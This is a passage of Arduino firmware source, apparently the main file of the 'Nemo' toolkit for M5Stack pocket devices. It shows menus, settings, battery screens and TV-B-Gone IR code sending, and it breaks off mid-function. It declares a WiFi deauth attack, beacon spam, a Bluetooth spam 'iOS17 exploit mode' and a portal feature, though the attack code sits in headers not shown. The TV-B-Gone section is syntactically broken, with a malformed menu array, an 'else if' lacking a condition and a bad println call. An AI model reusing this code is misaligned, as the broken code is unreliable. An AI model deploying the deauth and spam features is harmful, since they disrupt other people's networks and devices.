// Nemo Firmware for the M5 Stack Stick C Plus
// github.com/n0xa | IG: @4x0nn

// -=-=-=-=-=-=- Uncomment the platform you're building for -=-=-=-=-=-=-
// #define STICK_C_PLUS
// #define STICK_C_PLUS2
// #define STICK_C
// #define CARDPUTER
// -=-=- Uncommenting more than one at a time will result in errors -=-=-

// -=-=- NEMO Language for Menu and Portal -=- Thanks, @marivaaldo and @Mmatuda! -=-=-
// #define LANGUAGE_EN_US
// #define LANGUAGE_PT_BR
// #define LANGUAGE_IT_IT
// #define LANGUAGE_FR_FR

// -- DEPRECATED - THESE ARE NOW EEPROM DEFINED -- //
uint16_t BGCOLOR=0x0001; // placeholder
uint16_t FGCOLOR=0xFFF1; // placeholder

#ifndef NEMO_VERSION
  #define NEMO_VERSION "dev"
#endif

#if !defined(CARDPUTER) && !defined(STICK_C_PLUS2) && !defined(STICK_C_PLUS) && !defined(STICK_C)
  #define CARDPUTER
#endif

#if !defined(LANGUAGE_EN_US) && !defined(LANGUAGE_PT_BR) && !defined(LANGUAGE_IT_IT) && !defined(LANGUAGE_FR_FR)
  #define LANGUAGE_EN_US
#endif

// -=-=- DEAUTHER -=-  @bmorcelli -=-=- | Discord: Pirata#5263 bmorcelli
#define DEAUTHER  //Need to make some changes in arduino IDE, refer to https://github.com/bmorcelli/m5stickC_Plus2-nemo/tree/main/DEAUTH%20Prerequisites


#if defined(STICK_C_PLUS)
  #include <M5StickCPlus.h>
  // -=-=- Display -=-=-
  String platformName="StickC+";
  #define BIG_TEXT 4
  #define MEDIUM_TEXT 3
  #define SMALL_TEXT 2
  #define TINY_TEXT 1
  // -=-=- FEATURES -=-=-
  #define M5LED 10
  #define RTC
  #define AXP
  #define ACTIVE_LOW_IR
  #define ROTATION
  #define USE_EEPROM
  //#define SDCARD   //Requires a custom-built adapter
  //#define SONG

  // -=-=- ALIASES -=-=-
  #define DISP M5.Lcd
  #define IRLED 9
  #define SPEAKER M5.Beep
//  #define BITMAP M5.Lcd.drawBitmap(0, 0, 320, 240, NEMOMatrix) // This doesn't work, generates static.
  #define BITMAP Serial.println("unsupported")
  #define SD_CLK_PIN 0
  #define SD_MISO_PIN 36
  #define SD_MOSI_PIN 26
  #define SD_CS_PIN -1 //can be 14, to avoid serial messages
  #define M5LED_ON LOW
  #define M5LED_OFF HIGH
#endif

#if defined(STICK_C_PLUS2)
  #include <M5StickCPlus2.h>
  // -=-=- Display -=-=-
  String platformName="StickC+2";
  #define BIG_TEXT 4
  #define MEDIUM_TEXT 3
  #define SMALL_TEXT 2
  #define TINY_TEXT 1
  // -=-=- FEATURES -=-=-
  #define ACTIVE_LOW_IR
  #define M5LED 19
  #define ROTATION
  #define USE_EEPROM
  #define RTC      //TODO: plus2 has a BM8563 RTC but the class isn't the same, needs work.
  #define SDCARD   //Requires a custom-built adapter
  #define PWRMGMT
  #define SPEAKER M5.Speaker
  //#define SONG
  // -=-=- ALIASES -=-=-
  #define DISP M5.Lcd
  #define IRLED 19
  #define BITMAP M5.Lcd.drawBmp(NEMOMatrix, 97338)
  #define M5_BUTTON_MENU 35
  #define M5_BUTTON_HOME 37
  #define M5_BUTTON_RST 39
  #define BACKLIGHT 27
  #define MINBRIGHT 190
  #define SD_CLK_PIN 0
  #define SD_MISO_PIN 36
  #define SD_MOSI_PIN 26
  #define SD_CS_PIN 14 //can be -1, but sends a lot of messages of error in serial monitor
  #define M5LED_ON HIGH
  #define M5LED_OFF LOW
#endif

#if defined(STICK_C)
  #include <M5StickC.h>
  // -=-=- Display -=-=-
  String platformName="StickC";
  #define BIG_TEXT 2
  #define MEDIUM_TEXT 2
  #define SMALL_TEXT 1
  #define TINY_TEXT 1
  // -=-=- FEATURES -=-=-
  #define M5LED 10
  #define RTC
  #define AXP
  #define ROTATION
  #define USE_EEPROM
  #define SDCARD   //Requires a custom-built adapter
  //#define SONG
  // -=-=- ALIASES -=-=-
  #define DISP M5.Lcd
  #define IRLED 9
  #define BITMAP Serial.println("unsupported")
  #define SD_CLK_PIN 0
  #define SD_MISO_PIN 36
  #define SD_MOSI_PIN 26
  #define SD_CS_PIN -1 //can be 14, to avoid serial messages
  #define M5LED_ON LOW
  #define M5LED_OFF HIGH
#endif

#if defined(CARDPUTER)
  #include <M5Cardputer.h>
  // -=-=- Display -=-=-
  String platformName="Cardputer";
  #define BIG_TEXT 4
  #define MEDIUM_TEXT 3
  #define SMALL_TEXT 2
  #define TINY_TEXT 1
  // -=-=- FEATURES -=-=-
  #define KB
  #define HID
  #define ACTIVE_LOW_IR
  #define USE_EEPROM
  #define SDCARD
  //#define SONG
  // -=-=- ALIASES -=-=-
  #define DISP M5Cardputer.Display
  #define IRLED 44
  #define BACKLIGHT 38
  #define MINBRIGHT 165
  #define SPEAKER M5Cardputer.Speaker
  #define BITMAP M5Cardputer.Display.drawBmp(NEMOMatrix, 97338)
  #define SD_CLK_PIN 40
  #define SD_MISO_PIN 39
  #define SD_MOSI_PIN 14
  #define SD_CS_PIN 12
  #define VBAT_PIN 10
  #define M5LED_ON LOW
  #define M5LED_OFF HIGH
#endif

// -=-=-=-=-=- LIST OF CURRENTLY DEFINED FEATURES -=-=-=-=-=-
// M5LED      - A visible LED (Red) exposed on this pin number
// IRLED      - An IR LED exposed on this pin number
// RTC        - Real-time clock exposed as M5.Rtc 
// AXP        - AXP192 Power Management exposed as M5.Axp
// PWRMGMT    - StickC+2 Power Management exposed as M5.Power
// KB         - Keyboard exposed as M5Cardputer.Keyboard
// HID        - HID exposed as USBHIDKeyboard
// USE_EEPROM - Store settings in EEPROM
// ROTATION   - Allow screen to be rotated
// DISP       - Set to the API's Display class
// SDCARD     - Device has an SD Card Reader attached
// SONG       - Play melody or beep on startup
// SPEAKER    - Aliased to the prefix used for making noise
// BACKLIGHT  - Alias to the pin used for the backlight on some models
// MINBRIGHT  - The lowest number (0-255) for the backlight to show through

/// SWITCHER ///
// Proc codes
// 0  - Clock
// 1  - Main Menu
// 2  - Settings Menu
// 3  - Clock set
// 4  - Dimmer Time adjustment
// 5  - TV B-GONE
// 6  - Battery info
// 7  - screen rotation
// 8  - AppleJuice Menu
// 9  - AppleJuice Advertisement
// 10 - Credits
// 11 - Wifi beacon spam
// 12 - Wifi tools menu
// 13 - TV-B-Gone Region Setting
// 14 - Wifi scanning
// 15 - Wifi scan results
// 16 - Bluetooth Spam Menu
// 17 - Bluetooth Maelstrom
// 18 - QR Codes
// 19 - NEMO Portal
// 20 - Attack menu
// 21 - Deauth Attack
// 22 - Custom Color Settings
// 23 - Pre-defined color themes
// .. - ..
// 97 - Mount/UnMount SD Card on M5Stick devices, if SDCARD is declared

const String contributors[] PROGMEM = {
  "@bicurico",
  "@bmorcelli",
  "@chr0m1ng",
  "@doflamingozk",
  "@9Ri7",
  "@gustavocelani",
  "@imxnoobx",
  "@klamath1977",
  "@marivaaldo",
  "@mmatuda",
  "@n0xa",
  "@niximkk",
  "@unagironin",
  "@vladimirpetrov",
  "@vs4vijay"
};

int advtime = 0; 
int cursor = 0;
int wifict = 0;
int brightness = 100;
int ajDelay = 1000;
int apSsidOffset = 16;
int apSsidMaxLen = 32;
bool rstOverride = false;   // Reset Button Override. Set to true when navigating menus.
bool sourApple = false;     // Internal flag to place AppleJuice into SourApple iOS17 Exploit Mode
bool swiftPair = false;     // Internal flag to place AppleJuice into Swift Pair random packet Mode
bool androidPair = false;   // Internal flag to place AppleJuice into Android Pair random packet Mode
bool maelstrom = false;     // Internal flag to place AppleJuice into Bluetooth Maelstrom mode
bool portal_active = false; // Internal flag used to ensure NEMO Portal exits cleanly
bool activeQR = false; 
const byte PortalTickTimer = 1000;
String apSsidName = String("");
bool isSwitching = true;
#if defined(RTC)
  int current_proc = 0; // Start in Clock Mode
#else
  int current_proc = 1; // Start in Main Menu mode if no RTC
#endif
// DEAUTH vars
uint8_t channel;
String apMac = String("");
bool target_deauth_flg = false;
bool target_deauth = false;
int deauth_tick = 0;        // used to delay the deauth packets when combined to Nemo Portal
bool clone_flg = false;
// DEAUTH end


#if defined(USE_EEPROM)
  #include <EEPROM.h>
  #define EEPROM_SIZE 64
#endif
#include <IRremoteESP8266.h>
#include <IRsend.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "applejuice.h"
#include "WORLD_IR_CODES.h"
#include "wifispam.h"
#include "sd.h"
#include "portal.h"
#include "NEMOMatrix.h"
#include "songs.h"
#include "localization.h"
#include <BLEUtils.h>
#include <BLEServer.h>
#if defined(DEAUTHER)
  #include "deauth.h"                                                               //DEAUTH
  #include "esp_wifi.h"                                                             //DEAUTH
  wifi_ap_record_t ap_record;                                                       //DEAUTH
#endif
struct MENU {
  char name[19];
  int command;
};

struct QRCODE {
  char name[19];
  String url;
};

QRCODE qrcodes[] = {
  { TXT_BACK, "" },
  { "Rickroll", "https://youtu.be/dQw4w9WgXcQ"},
  { "HackerTyper", "https://hackertyper.net/"},
  { "ZomboCom", "https://html5zombo.com/"},
};


void drawmenu(MENU thismenu[], int size) {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0, 1);
  // scrolling menu
  if (cursor < 0) {
    cursor = size - 1;  // rollover hack for up-arrow on cardputer
  }
  if (cursor > 5) {
    for ( int i = 0 + (cursor - 5) ; i < size ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19s\n",thismenu[i].name);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  } else {
    for (
      int i = 0 ; i < size ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19s\n",thismenu[i].name);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  }
}

void number_drawmenu(int nums) {
  DISP.setTextSize(SMALL_TEXT);
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  // scrolling menu
  if (cursor > 5) {
    for ( int i = 0 + (cursor - 5) ; i < nums ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19d\n",i);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  } else {
    for (
      int i = 0 ; i < nums ; i++ ) {
      if(cursor == i){
        DISP.setTextColor(BGCOLOR, FGCOLOR);
      }
      DISP.printf(" %-19d\n",i);
      DISP.setTextColor(FGCOLOR, BGCOLOR);
    }
  }
}

void switcher_button_proc() {
  if (rstOverride == false) {
    if (check_next_press()) {
      isSwitching = true;
      current_proc = 1;
    }
  }
}

// Tap the power button from pretty much anywhere to get to the main menu
void check_menu_press() {
#if defined(AXP)
  if (M5.Axp.GetBtnPress()) {
#endif
#if defined(KB)
  if (M5Cardputer.Keyboard.isKeyPressed(',') || M5Cardputer.Keyboard.isKeyPressed('`')){
#endif
#if defined(M5_BUTTON_MENU)
  if (digitalRead(M5_BUTTON_MENU) == LOW){
#endif
    dimtimer();
    if(portal_active){
      // just in case we escape the portal with the main menu button
      shutdownWebServer();
      portal_active = false;
    }
    isSwitching = true;
    rstOverride = false;
    current_proc = 1;
    delay(100);
  }
}

bool check_next_press(){
#if defined(KB)
  M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed(';')){
    // hack to handle the up arrow
    cursor = cursor - 2;
    dimtimer();
    return true;
  }
  //M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_TAB) || M5Cardputer.Keyboard.isKeyPressed('.')){
    dimtimer();
    return true;
  }
#else
  if (digitalRead(M5_BUTTON_RST) == LOW){
    dimtimer();
    return true;
  }
#endif
  return false;
}

bool check_select_press(){
#if defined(KB)
  M5Cardputer.update();
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) || M5Cardputer.Keyboard.isKeyPressed('/')){
    dimtimer();
    return true;
  }
#else
  if (digitalRead(M5_BUTTON_HOME) == LOW){
    dimtimer();
    return true;
  }
#endif
  return false;
}

/// MAIN MENU ///
MENU mmenu[] = {
#if defined(RTC)
  { TXT_CLOCK, 0},
#endif
  { "TV-B-Gone", 13}, // We jump to the region menu first
  { "Bluetooth", 16},
  { "WiFi", 12},
  { "QR Codes", 18},
  { TXT_SETTINGS, 2},
};
int mmenu_size = sizeof(mmenu) / sizeof(MENU);

void mmenu_setup() {
  cursor = 0;
  rstOverride = true;
  drawmenu(mmenu, mmenu_size);
  delay(500); // Prevent switching after menu loads up
}

void mmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % mmenu_size;
    drawmenu(mmenu, mmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    rstOverride = false;
    isSwitching = true;
    current_proc = mmenu[cursor].command;
  }
}

bool screen_dim_dimmed = false;
int screen_dim_time = 30;
int screen_dim_current = 0;

void screenBrightness(int bright){
  Serial.printf("Brightness: %d\n", bright);
  #if defined(AXP)
    M5.Axp.ScreenBreath(10 + round(((100 - 10) * bright / 100)));
  #endif
  #if defined(BACKLIGHT)
    int bl = MINBRIGHT + round(((255 - MINBRIGHT) * bright / 100)); 
    analogWrite(BACKLIGHT, bl);
  #endif
}

int uptime(){
  return(int(millis() / 1000));
}

void dimtimer(){
  if(screen_dim_dimmed){
    screenBrightness(brightness);
    screen_dim_dimmed = false;
  }
  screen_dim_current = uptime() + screen_dim_time + 2;
}

void screen_dim_proc() {
  if(screen_dim_time > 0){
    if (screen_dim_dimmed == false) {
      if (uptime() == screen_dim_current || (uptime() + 1) == screen_dim_current || (uptime() + 2) == screen_dim_current) {
        screenBrightness(0);
        screen_dim_dimmed = true;
      }
    }
  }
}

/// Dimmer MENU ///
MENU dmenu[] = {
  { TXT_BACK, screen_dim_time},
  { TXT_NEVER, 0},
  { ("5 " TXT_SEC), 5},
  { ("10 " TXT_SEC), 10},
  { ("15 " TXT_SEC), 15},
  { ("30 " TXT_SEC), 30},
  { ("60 " TXT_SEC), 60},
  { ("120 " TXT_MIN), 120},
  { ("240 " TXT_MIN), 240},
};
int dmenu_size = sizeof(dmenu) / sizeof(MENU);

void dmenu_setup() {
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(String(TXT_AUTO_DIM));
  delay(1000);
  cursor = 0;
  rstOverride = true;
  drawmenu(dmenu, dmenu_size);
  delay(500); // Prevent switching after menu loads up
}

void dmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % dmenu_size;
    drawmenu(dmenu, dmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    screen_dim_time = dmenu[cursor].command;
    #if defined(USE_EEPROM)
      EEPROM.write(1, screen_dim_time);
      EEPROM.commit();
    #endif
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.println(String(TXT_SET_BRIGHT));
    delay(1000);
    cursor = brightness / 10;
    number_drawmenu(11);
    while( !check_select_press()) {
      if (check_next_press()) {
        cursor++;
        cursor = cursor % 11 ;
        number_drawmenu(11);
        screenBrightness(10 * cursor);
        delay(250);
       }
    }
    screenBrightness(10 * cursor);
    #if defined(USE_EEPROM)
      EEPROM.write(2, 10 * cursor);
      EEPROM.commit();
    #endif
    rstOverride = false;
    isSwitching = true;
    current_proc = 2;
  }
}

/// SETTINGS MENU ///
MENU smenu[] = {
  { TXT_BACK, 1},
#if defined(AXP) || defined(PWRMGMT)
  { TXT_BATT_INFO, 6},
#endif
#if defined(CARDPUTER)
  { TXT_BATT_INFO, 6},
#endif
  { TXT_BRIGHT, 4},
#if defined(RTC)
  { TXT_SET_CLOCK, 3},
#endif
#if defined(ROTATION)
  { TXT_ROTATION, 7},
#endif
#if defined(SDCARD)
  #ifndef CARDPUTER
    { TXT_SDCARD, 97},
  #endif
#endif
  { TXT_THEME, 23},
  { TXT_ABOUT, 10},
  { TXT_REBOOT, 98},
#if defined(USE_EEPROM)
  { TXT_CLR_SETTINGS, 99},
#endif
};

int smenu_size = sizeof(smenu) / sizeof (MENU);

void smenu_setup() {
  cursor = 0;
  rstOverride = true;
  drawmenu(smenu, smenu_size);
  delay(500); // Prevent switching after menu loads up
}

void clearSettings(){
  #if defined(USE_EEPROM)
  for(int i = 0; i < EEPROM_SIZE; i++) {
    EEPROM.write(i, 255);
  }
  EEPROM.commit();
  #endif
  screenBrightness(100);
  DISP.fillScreen(BLUE);
  DISP.setTextSize(BIG_TEXT);
  DISP.setRotation(1);
  DISP.setTextColor(BLUE, WHITE);
  DISP.setCursor(40, 0);
  DISP.println("M5-NEMO");
  DISP.setTextColor(WHITE, BLUE);
  DISP.setTextSize(SMALL_TEXT);
  DISP.println(TXT_CLRING_SETTINGS);
  delay(5000);
  ESP.restart();
}

void smenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % smenu_size;
    drawmenu(smenu, smenu_size);
    delay(250);
  }
  if (check_select_press()) {
    rstOverride = false;
    isSwitching = true;
    if(smenu[cursor].command == 98){
      ESP.restart();
    }
    if(smenu[cursor].command == 99){
      clearSettings();
    }
    current_proc = smenu[cursor].command;
  }
}

MENU cmenu[] = {
  { TXT_BACK, 0},
  { TXT_BLACK, 1},
  { TXT_NAVY, 2},
  { TXT_DARKGREEN, 3},
  { TXT_DARKCYAN, 4},
  { TXT_MAROON, 5},
  { TXT_PURPLE, 6},
  { TXT_OLIVE, 7},
  { TXT_LIGHTGREY, 8},
  { TXT_DARKGREY, 9},
  { TXT_BLUE, 10},
  { TXT_GREEN, 11},
  { TXT_CYAN, 12},
  { TXT_RED, 13},
  { TXT_MAGENTA, 14},
  { TXT_YELLOW, 15},
  { TXT_WHITE, 16},
  { TXT_ORANGE, 17},
  { TXT_GREENYELLOW, 18},
  { TXT_PINK, 19},
};
int cmenu_size = sizeof(cmenu) / sizeof (MENU);

void setcolor(bool fg, int col){
  uint16_t color = 0x0000;
  switch (col){
    case 1:
      color=0x0000;
      break; 
    case 2:
      color=0x000F;
      break;
    case 3:
      color=0x03E0;
      break;
    case 4:
      color=0x03EF;
      break;
    case 5:
      color=0x7800;
      break;
    case 6:
      color=0x780F;
      break;
    case 7:
      color=0x7BE0;
      break;
    case 8:
      color=0xC618;
      break;
    case 9:
      color=0x7BEF;
      break;
    case 10:
      color=0x001F;
      break;
    case 11:
      color=0x07E0;
      break;
    case 12:
      color=0x07FF;
      break;
    case 13:
      color=0xF800;
      break;
    case 14:
      color=0xF81F;
      break;
    case 15:
      color=0xFFE0;
      break;
    case 16:
      color=0xFFFF;
      break;
    case 17:
      color=0xFDA0;
      break;
    case 18:
      color=0xB7E0;
      break;
    case 19:
      color=0xFC9F;
      break;
  }
  if(fg){
    FGCOLOR=color;
  }else{
    BGCOLOR=color;
  }
  if(FGCOLOR == BGCOLOR){
    BGCOLOR = FGCOLOR ^ 0xFFFF;
  }
  DISP.setTextColor(FGCOLOR, BGCOLOR);
}

void color_setup() {
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(String(TXT_SET_FGCOLOR));
  cursor = 0;
  #if defined(USE_EEPROM)
    cursor=EEPROM.read(4); // get current fg color
  #endif
  rstOverride = true;
  delay(1000);  
  drawmenu(cmenu, cmenu_size);
}

void color_loop() {
  if (check_next_press()) {
    setcolor(EEPROM.read(5), false);
    cursor++;
    cursor = cursor % cmenu_size;
    setcolor(true, cursor);
    drawmenu(cmenu, cmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    #if defined(USE_EEPROM)
      Serial.printf("EEPROM WRITE (4) FGCOLOR: %d\n", cursor);
      EEPROM.write(4, cursor);
      EEPROM.commit();
      cursor=EEPROM.read(5); // get current bg color
    #endif
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 0);
    DISP.println(String(TXT_SET_BGCOLOR));
    delay(1000);
    setcolor(false, cursor);
    drawmenu(cmenu, cmenu_size);
    while( !check_select_press()) {
      if (check_next_press()) {
        cursor++;
        cursor = cursor % cmenu_size ;
        setcolor(false, cursor);
        drawmenu(cmenu, cmenu_size);
        delay(250);
       }
    }
    #if defined(USE_EEPROM)
      Serial.printf("EEPROM WRITE (5) BGCOLOR: %d\n", cursor);
      EEPROM.write(5, cursor);
      EEPROM.commit();
    #endif
    rstOverride = false;
    isSwitching = true;
    current_proc = 2;
  }
}

MENU thmenu[] = {
  { TXT_BACK, 0},
  { "Nemo", 1},
  { "Tux", 2},
  { "Bill", 3},
  { "Steve", 4},
  { "Lilac", 5},
  { "Contrast", 6},
  { "NightShift", 7},
  { "Camo", 8},
  { "BubbleGum", 9},
  { TXT_COLOR, 99},
};
int thmenu_size = sizeof(thmenu) / sizeof (MENU);

void theme_setup() {
  DISP.fillScreen(BGCOLOR);
  DISP.setCursor(0, 0);
  DISP.println(String(TXT_THEME));
  cursor = 0;
  rstOverride = true;
  delay(1000);  
  drawmenu(thmenu, thmenu_size);
}

int BG=0;
int FG=0;

void theme_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % thmenu_size;
    switch (thmenu[cursor].command){
      case 0:
        FG=11;
        BG=1;
        break;       
      case 1: // Nemo
        FG=11;
        BG=1;
        break;
      case 2: // Tux
        FG=8;
        BG=1;
        break;  
      case 3: // Bill
        FG=16;
        BG=10;
        break;
      case 4: // Steve
        FG=1;
        BG=8;
        break;        
      case 5: // Lilac
        FG=19;
        BG=6;
        break;
      case 6: // Contrast
        FG=16;
        BG=1;
        break;
      case 7: // NightShift
        FG=5;
        BG=1;
         break;
      case 8: // Camo
        FG=1;
        BG=7;
        break;
      case 9: // BubbleGum
        FG=1;
        BG=19;
        break;
      case 99:
        FG=11;
        BG=1;
        break;
     }
    setcolor(true, FG);
    setcolor(false, BG);
    drawmenu(thmenu, thmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    switch (thmenu[cursor].command){
      case 99:
        rstOverride = false;
        isSwitching = true;
        current_proc = 22;
        break;
      case 0:
        #if defined(USE_EEPROM)
          setcolor(true, EEPROM.read(4));
          setcolor(false, EEPROM.read(5));
        #endif
        rstOverride = false;
        isSwitching = true;
        current_proc = 2;
        break;
      default:
        #if defined(USE_EEPROM)
          Serial.printf("EEPROM WRITE (4) FGCOLOR: %d\n", FG);
          EEPROM.write(4, FG);
          Serial.printf("EEPROM WRITE (5) BGCOLOR: %d\n", BG);
          EEPROM.write(5, BG);
          EEPROM.commit();
        #endif
        rstOverride = false;
        isSwitching = true;
        current_proc = 2;
    }
  }
}

int rotation = 1;
#if defined(ROTATION)
  /// Rotation MENU ///
  MENU rmenu[] = {
    { TXT_BACK, rotation},
    { TXT_RIGHT, 1},
    { TXT_LEFT, 3},
  };
  int rmenu_size = sizeof(rmenu) / sizeof (MENU);

  void rmenu_setup() {
    cursor = 0;
    rstOverride = true;
    drawmenu(rmenu, rmenu_size);
    delay(500); // Prevent switching after menu loads up
  }

  void rmenu_loop() {
    if (check_next_press()) {
      cursor++;
      cursor = cursor % rmenu_size;
      drawmenu(rmenu, rmenu_size);
      delay(250);
    }
    if (check_select_press()) {
      rstOverride = false;
      isSwitching = true;
      rotation = rmenu[cursor].command;
      DISP.setRotation(rotation);
      #if defined(USE_EEPROM)
        EEPROM.write(0, rotation);
        EEPROM.commit();
      #endif
      current_proc = 2;
    }
  }
#endif //ROTATION

/// BATTERY INFO ///

#if defined(PWRMGMT)
  int old_battery = 0;

  void battery_drawmenu(int battery) {
    DISP.setTextSize(SMALL_TEXT);
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 8, 1);
    DISP.print(TXT_BATT);
    DISP.print(battery);
    DISP.println("%");
    DISP.println(TXT_EXIT);
  }

  int get_battery_voltage() {
    return M5.Power.getBatteryLevel();
  }

  void battery_setup() {
    int battery = get_battery_voltage();
    battery_drawmenu(battery);
    delay(500); // Prevent switching after menu loads up
  }

  void battery_loop() {
    delay(300);
    int battery = get_battery_voltage();

    if (battery != old_battery){
      battery_drawmenu(battery);
    }
    if (check_select_press()) {
      isSwitching = true;
      current_proc = 1;
    }
    old_battery = battery;
  }
#endif

#ifdef AXP
  int old_battery=0;
  void battery_drawmenu(int battery, int b, int c) {
    DISP.setTextSize(SMALL_TEXT);
    DISP.fillScreen(BGCOLOR);
    DISP.setCursor(0, 8, 1);
    DISP.print(TXT_BATT);
    DISP.print(battery);
    DISP.println("%");
    DISP.print("DeltaB: ");
    DISP.println(b);
    DISP.print("DeltaC: ");
    DISP.println(c);
    DISP.println("");
    DISP.println(TXT_EXIT);
  }

  void battery_setup() {
    rstOverride = false;
    float c = M5.Axp.GetVapsData() * 1.4 / 1000;
    float b = M5.Axp.GetVbatData() * 1.1 / 1000;
    int battery = ((b - 3.0) / 1.2) * 100;
    battery_drawmenu(battery, b, c);
    delay(500); // Prevent switching after menu loads up
  }

  void battery_loop() {
    delay(300);
    float c = M5.Axp.GetVapsData() * 1.4 / 1000;
    float b = M5.Axp.GetVbatData() * 1.1 / 1000;
    int battery = ((b - 3.0) / 1.2) * 100;
    if (battery != old_battery){
      battery_drawmenu(battery, b, c);
    }
    if (check_select_press()) {
      rstOverride = false;
      isSwitching = true;
      current_proc = 1;
    }
    old_battery = battery;
  }
#endif // AXP

#if defined(CARDPUTER)
  /// BATTERY INFO ///
  uint8_t oldBattery = 0;
  void battery_drawmenu(uint8_t battery) {
    // Battery bar color definition
    uint16_t batteryBarColor = BLUE;
    if(battery < 20) {
      batteryBarColor = RED;
    } else if(battery < 60) {
      batteryBarColor = ORANGE;
    } else {
      batteryBarColor = GREEN;
    }
    // Battery bar
    DISP.fillScreen(BGCOLOR);
    DISP.drawRect(10, 10, 220, 100, batteryBarColor);
    DISP.fillRect(10, 10, (220 * battery / 100), 100, batteryBarColor);
    // Battery percentage
    DISP.setTextColor(WHITE);
    DISP.setTextSize(BIG_TEXT);
    DISP.setCursor(80, 45, 1);
    DISP.print(battery);
    DISP.println("%");
    // Exit text
    DISP.setCursor(10, 120, 1);
    DISP.setTextSize(TINY_TEXT);
    DISP.println(TXT_EXIT);
    DISP.setTextColor(FGCOLOR, BGCOLOR);
  }

  void battery_setup() {
    rstOverride = false;
    pinMode(VBAT_PIN, INPUT);
    uint8_t battery = ((((analogRead(VBAT_PIN)) - 1842) * 100) / 738);
    battery_drawmenu(battery);
    delay(500); // Prevent switching after menu loads up
    /*
      Used minimum 3,0V and maximum 4,2V for battery. So it may show wrong values. Needs testing.
      It only shows decent values when disconnected from charger, due to HW limitations.
      Equation: Bat% = ((Vadc - 1842) / (2580 - 1842)) * 100. Where: 4,2V = 2580, 3,0V = 1842.
    */
  }

  void battery_loop() {
    // Read 30 battery values to calculate the average (avoiding unprecise and close values)
    uint16_t batteryValues = 0;
    for(uint8_t i = 0; i < 30; i++) { // 30 iterations X 100ms = 3 seconds for each refresh
      delay(100);
      batteryValues += ((((analogRead(VBAT_PIN)) - 1842) * 100) / 738);
      M5Cardputer.update();
      if(M5Cardputer.Keyboard.isChange() && M5Cardputer.Keyboard.isPressed()) { // If any key is pressed
        rstOverride = false;
        isSwitching = true;
        current_proc = 1;
        break;
      }
    }

    if(!isSwitching) { // If is not switching, calculate battery average
      uint8_t battery = batteryValues / 30; // Iteration times
      Serial.printf("Battery Level: %d\n", battery);
      if(battery != oldBattery) { // Only draw a new screen if value is different
        oldBattery = battery;
        battery_drawmenu(battery);
      }
    }
  }
#endif // Cardputer

/// TV-B-GONE ///
void tvbgone_setup() {
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(0, 0);
  DISP.println("TV-B-Gone");
  DISP.setTextSize(SMALL_TEXT);
  irsend.begin();
  // Hack: Set IRLED high to turn it off after setup. Otherwise it stays on (active low)
  digitalWrite(IRLED, M5LED_OFF);

  delay_ten_us(5000);
  if(region == NA) {
    DISP.print(TXT_RG_AMERICAS);
  }
  else if (region == EU) {
    DISP.println(TXT_RG_EMEA);
  } 
  else {
    DISP.println(TXT_RG_CUSTOM);
  }
  DISP.println(TXT_SEL_GO_PAUSE);
  DISP.println(TXT_SEL_EXIT);
  delay(1000);
}

void tvbgone_loop()
{
  if (check_select_press()) {
    delay(250);
    Serial.println(TXT_TRIG_TV);
    sendAllCodes();
  }
}

/// TVBG-Region MENU ///
MENU tvbgmenu[] = {
  { TXT_BACK, 3},
  { TXT_MN_AMERICA, 0},
  { TXT_MN_EMEA, 1},
  { TXT_MN_CUSTOM, 2}
  { TXT_MN_CUSTOM,"2", 4}
};
int tvbgmenu_size = sizeof(tvbgmenu) / sizeof (MENU);

void tvbgmenu_setup() {  
  DISP.fillScreen(BGCOLOR);
  DISP.setTextSize(BIG_TEXT);
  DISP.setCursor(0, 0);
  DISP.println("TV-B-Gone");
  DISP.setTextSize(MEDIUM_TEXT);
  DISP.println(TXT_REGION);
  cursor = region % 2;
  rstOverride = true;
  delay(1000); 
  drawmenu(tvbgmenu, tvbgmenu_size);
}

void tvbgmenu_loop() {
  if (check_next_press()) {
    cursor++;
    cursor = cursor % tvbgmenu_size;
    drawmenu(tvbgmenu, tvbgmenu_size);
    delay(250);
  }
  if (check_select_press()) {
    region = tvbgmenu[cursor].command;

    if (region == 3) {
      current_proc = 1;
      isSwitching = true;
      rstOverride = false; 
      return;
    }    
    #if defined(USE_EEPROM)
      EEPROM.write(3, region);
      EEPROM.commit();
    #endif
    rstOverride = false;
    isSwitching = true;
    current_proc = 5;
  }
}

void sendAllCodes() {
  bool endingEarly = false; //will be set to true if the user presses the button during code-sending
  if (region == NA) {
    num_codes = num_NAcodes;
  } else if (region == EU) {
    num_codes = num_EUcodes;
  } else if {
    num_codes = num_CUSTOMcodes;
  }
  else {
    #if defined(SD_CARD)
      DISP.fillScreen(BGCOLOR);
      DISP.println(TXT_TRIG_TV);
      DISP.println(TXT_RG_CUSTOM,"2");
      otherIRcodes();
    #endif
  }
  for (i = 0 ; i < num_codes; i++)
  {
